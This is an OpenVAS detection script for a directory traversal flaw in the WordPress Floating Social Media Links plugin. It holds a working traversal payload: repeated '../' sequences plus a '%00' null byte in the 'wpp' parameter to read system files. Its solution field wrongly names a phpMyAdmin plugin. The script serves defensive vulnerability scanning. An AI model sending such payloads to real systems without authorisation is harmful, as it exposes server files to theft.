###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_floating_social_media_wpp_rfi_vuln.nasl 13962 2019-03-01 14:14:42Z cfischer $
#
# WordPress Floating Social Media Links Plugin 'wpp' RFI Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803078");
  script_version("$Revision: 13962 $");
  script_bugtraq_id(56913);
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Do, 26 Okt 2017)$");
  script_tag(name:"creation_date", value:"2012-12-18 12:54:08 +0530 (Tue, 18 Dec 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WordPress Floating Social Media Links Plugin 'wpp' RFI Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/51346");
  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/floating-social-media-links/changelog/");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.");

  script_tag(name:"affected", value:"WordPress Floating Social Media Links Plugin version 1.4.2 and prior");

  script_tag(name:"insight", value:"The flaw is due to an improper validation of user supplied input to the
  'wpp' parameter in 'fsml-hideshow.js.php' and 'fsml-admin.js.php', which
  allows attackers to read arbitrary files via a ../(dot dot) sequences.");

  script_tag(name:"solution", value:"Upgrade to the WordPress Portable phpMyAdmin Plugin version 1.4.3 or later.");

  script_tag(name:"summary", value:"This host is installed with WordPress Floating Social Media Links Plugin and
  is prone to remote file inclusion vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);
if(dir == "/") dir = "";

files = traversal_files();

foreach file (keys(files)){

  url = string(dir, "/wp-content/plugins/floating-social-media-links/fsml-hideshow.js.php?wpp=", crap(data:"../", length:3*15), files[file], "%00");

  if(http_vuln_check(port:port, url:url,pattern:file)){
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);